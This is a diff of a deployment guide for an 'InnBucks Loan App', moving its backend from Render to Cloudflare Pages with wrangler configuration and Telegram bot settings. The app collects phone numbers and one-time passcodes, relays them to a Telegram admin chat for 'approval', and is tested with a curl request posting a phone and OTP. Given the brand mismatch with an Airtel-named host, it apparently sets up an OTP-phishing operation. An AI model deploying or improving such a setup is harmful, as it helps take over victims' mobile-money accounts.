@@ -1,6 +1,6 @@
 # Deployment Guide: InnBucks Loan App
 
-Complete guide to deploy the full-stack application on **Cloudflare Pages (fullstack)** and/or **Render** (legacy backend).
+Complete guide to deploy the full-stack application on **Cloudflare Pages (fullstack)**.
 
 ---
 
@@ -45,7 +45,7 @@ Before deployment, set the backend URL in your frontend. Add this to `index.html
 
 ```javascript
 // Set backend URL (on index.html or config file)
-localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
+localStorage.setItem("backendUrl", "https://<your-pages>.pages.dev");
 ```
 
 Or dynamically detect environment:
@@ -54,56 +54,67 @@ Or dynamically detect environment:
 const isDevelopment = window.location.hostname === "localhost";
 const backendUrl = isDevelopment
   ? "http://localhost:3000"
-  : "https://airtel-01.onrender.com";
+  : "https://<your-pages>.pages.dev";
 localStorage.setItem("backendUrl", backendUrl);
 ```
 
 ---
 
-## ☁️ Deploy Backend on Render
+## ☁️ Cloudflare Pages Backend + Frontend
+
+This fullstack guide uses Cloudflare Pages to serve the static frontend and API functions from the same domain.
 
 ### Step 1: Create GitHub Repository
 
 ```bash
-cd backend
 git init
 git add .
-git commit -m "Initial backend setup"
+git commit -m "Initial fullstack setup"
 git push -u origin main
 ```
 
-### Step 2: Create Render Service
+### Step 2: Configure `wrangler.toml`
 
-1. Go to [render.com](https://render.com)
-2. Click **New +** → **Web Service**
-3. Connect your GitHub repository
-4. Configure:
-   - **Name**: `innbucks-otp-backend`
-   - **Runtime**: Node
-   - **Build Command**: `npm install`
-   - **Start Command**: `npm start`
+Ensure `wrangler.toml` exists in repo root with:
 
-### Step 3: Set Environment Variables
+```toml
+name = "inbucks-fullstack"
+main = "./functions"
+compatibility_date = "2026-04-03"
 
-In Render dashboard, add:
+[build]
+command = "npm install"
 
-```env
-TELEGRAM_BOT_TOKEN=123456789:ABCdefGHijKLmNoPqRstuvWXyz
-TELEGRAM_ADMIN_CHAT_ID=987654321
-TELEGRAM_CALLBACK_TOKEN=your_secret_123
-BACKEND_URL=https://airtel-01.onrender.com
-PORT=3000
+[site]
+bucket = "."
+entry-point = "functions"
+
+[vars]
+TELEGRAM_BOT_TOKEN = ""
+TELEGRAM_ADMIN_CHAT_ID = ""
+TELEGRAM_CALLBACK_TOKEN = ""
 ```
 
-### Step 4: Deploy
-
-Push to main branch to auto-deploy:
+### Step 3: Deploy to Cloudflare Pages
 
 ```bash
-git push origin main
+npm install -g wrangler
+wrangler login
+wrangler pages deploy ./ --branch=main --project-name=inbucks-fullstack
 ```
 
-✅ Backend URL: `https://airtel-01.onrender.com`
+### Step 4: Set Environment Variables
+
+In Cloudflare Pages project settings:
+
+- `TELEGRAM_BOT_TOKEN`
+- `TELEGRAM_ADMIN_CHAT_ID`
+- `TELEGRAM_CALLBACK_TOKEN`
+
+### Step 5: Confirm Deployment
+
+- Frontend: `https://<your-pages>.pages.dev`
+- API health: `https://<your-pages>.pages.dev/api/health`
 
 ---
 
@@ -133,13 +144,13 @@ git push -u origin main
 
 ### Step 3: Update Backend URL
 
-The frontend already has the backend URL configured in `index.html`. If you change the Render URL, update it there:
+The frontend already has the backend URL configured in `index.html`. If you change the Pages domain, update it there:
 
 ```javascript
 // In index.html, update the production URL
 const backendUrl = isDevelopment
   ? "http://localhost:3000"
-  : "https://your-new-render-url.onrender.com";
+  : "https://your-new-pages-domain.pages.dev";
 ```
 
 ✅ Frontend URL: `https://your-project.pages.dev`
@@ -171,7 +182,7 @@ Copy your **Chat ID**: `987654321`
 
 ### 3. Add to Environment Variables
 
-On Render dashboard:
+On Cloudflare Pages dashboard:
 
 ```env
 TELEGRAM_BOT_TOKEN=123456789:ABCdefGHijKLmNoPqRstuvWXyz
@@ -219,7 +230,7 @@ app.use(cors(corsOptions));
 Frontend sets dynamically:
 
 ```javascript
-localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
+localStorage.setItem("backendUrl", "https://<your-pages>.pages.dev");
 ```
 
 ---
@@ -229,7 +240,7 @@ localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
 ### 1. Test Backend Health
 
 ```bash
-curl https://airtel-01.onrender.com/api/health
+curl https://<your-pages>.pages.dev/api/health
 # Should return: {"status":"ok","service":"OTP Backend"}
 ```
 
@@ -256,10 +267,10 @@ Visit: `https://your-site.netlify.app`
 ### Backend not responding
 
 ```bash
-# Check logs on Render dashboard
+# Check logs on Cloudflare Pages dashboard
 # Verify environment variables are set
 # Test endpoint manually:
-curl -X POST https://airtel-01.onrender.com/api/otp/submit \
+curl -X POST https://<your-pages>.pages.dev/api/otp/submit \
   -H "Content-Type: application/json" \
   -d '{"phone":"+263712345678","otp":"12345","userId":"test"}'
 ```
@@ -281,29 +292,23 @@ curl -X POST https://airtel-01.onrender.com/api/otp/submit \
 
 ### CORS errors
 
-Add backend URL to Netlify build environment or hardcode in config.js
+Use correct Pages URL in localStorage and check Cloudflare Pages CORS settings.
 
 ---
 
 ## 📈 Monitoring
 
-### Render Dashboard
+### Cloudflare Pages Dashboard
 
 - View logs in real-time
-- Monitor CPU/Memory usage
+- Monitor build & function execution
 - Check deployment history
-
-### Netlify Dashboard
-
-- View analytics
-- Monitor build logs
-- Check deploy previews
 
 ---
 
 ## 🔐 Production Checklist
 
-- [ ] Environment variables set in Render
+- [ ] Environment variables set in Cloudflare Pages
 - [ ] Telegram bot token configured
 - [ ] Backend URL hardcoded or dynamic in frontend
 - [ ] CORS origins restricted
@@ -320,11 +325,11 @@ Add backend URL to Netlify build environment or hardcode in config.js
 
 If issues arise:
 
-1. Check backend logs: Render dashboard → Logs
+1. Check deployment logs: Cloudflare Pages dashboard → Logs
 2. Check frontend console: Browser DevTools → Console
 3. Test endpoints manually with `curl`
 4. Verify Telegram bot token and chat ID
-5. Check firewall/DNS settings
+5. Check DNS settings and custom domain config
 
 ---
 
@@ -332,8 +337,7 @@ If issues arise:
 
 Your loan application is now live with:
 
-- ✅ Frontend on Netlify
-- ✅ Backend on Render
+- ✅ Frontend + API on Cloudflare Pages
 - ✅ Telegram bot admin approval
 - ✅ Real-time OTP verification
 
